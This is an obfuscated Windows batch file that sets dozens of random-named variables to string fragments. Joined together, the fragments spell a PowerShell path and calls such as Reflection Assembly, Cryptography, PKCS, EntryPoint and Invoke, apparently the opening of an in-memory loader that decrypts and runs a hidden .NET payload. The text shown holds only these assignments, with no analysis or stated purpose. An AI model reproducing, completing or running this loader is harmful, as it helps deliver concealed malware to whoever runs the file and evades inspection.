@echo off
set "SgSDryokIw=py"
set "XLZemQrffp=he"
set "rRwzkaZFNI=rS"
set "xzmDSiMtfm=we"
set "csbLjJggHv=he"
set "ADLJlBoXNT= C"
set "CYQYQEUNOH=1."
set "wkRCscURqq=s\"
set "XqPpDnHRyK=Sy"
set "IlTlMXECox=in"
set "hDsWRvinXc=ll"
set "DaMnbfUuGM=em"
set "KGmTvRqDQP=y "
set "rHloxeUmAC=ws"
set "RocaWoqElU=ow"
set "MhXcQMAirc=xe"
set "iXtFoQuIXe=st"
set "kaPVpfmPTV=co"
set "RMHLTBJCAN=po"
set "exIUtUEXix=Wi"
set "WWyYquptCb=we"
set "VsmbjOWioL=ll"
set "NxPtQAyNwJ=32"
set "pMWYPHofKN=nd"
set "HzfAMyRmnC=\W"
set "PBJzlwlHTd=\v"
set "oIgeeCDEHS=Po"
set "ZDQoswcdsg=:\"
set "snkLXKhZPO=do"
set "AvyqOGPBEx=rs"
set "RHoQriiwhZ= /"
set "oiMhUOzAIP=0\"
set "bfvvowoqXm=.e"
set "voLdUvsBsp=cd"
set "FynFpUdFYK= %~dp0"
set "jCfnTOOVCo=y.Cr"
set "EYHEDTnMon='')("
set "PJQUxQvgMD=yste"
set "AyzeeDGorP=raph"
set "FChHvloEHO=)($V"
set "oCzPnbSpdv=UM ="
set "rIgnqqRdDW=.IO."
set "srOXSFAEXX=PKCS"
set "sJXrvWFXWF=y]::"
set "xyKDwRfFHB=Disp"
set "kVOCWpFirG=ionM"
set "wAJtpUvSMs=m = "
set "uOjHkWmYxT=ew-O"
set "ITyonkeUEJ=-1.."
set "AHhvkwccxu=rity"
set "GlHIqEQLwb=oint"
set "JFmSJlCFfF=$wSZ"
set "cwoNDaCYIo=Secu"
set "MsWGqaClAT= = N"
set "BOjBkncRdX=[Sys"
set "EIdqFXzhfI=tryP"
set "lxRbEeVDeV=comp"
set "GpfHvAFCRQ=bstr"
set "DzojhHhUjm=$roS"
set "ebHCNZDBjv=eam("
set "FHwcLySXYe=ach "
set "wqhZSgyCzW=flec"
set "ilRpGjEMdP=y.Ci"
set "owPkNrojze=Invo"
set "UXtJMjSgTx=iron"
set "ONKyvKjHcj=[Env"
set "CFozuIazbX== [S"
set "ClFoRePELv=File"
set "AvwOrRcvDQ=v4Ir"
set "TOidxaMjEe=em.I"
set "IZwQYDCLvZ=M = "
set "uLjIkpCdrd=[IO."
set "mkJdugSzPW=oin "
set "qwRMoSaRXS=yTo("
set "SDxPxVRPLu=ay()"
set "LPoQmSlQGi=S46e"
set "poeaOcBPrm=pStr"
set "aSeexAWRqS=ck($"
set "hBzpXZBxiE=16] "
set "stZzpLqoLj=nirt"
set "XoXaoYSKgB=ED, "
set "sCXjzOEUTu=bxBz"
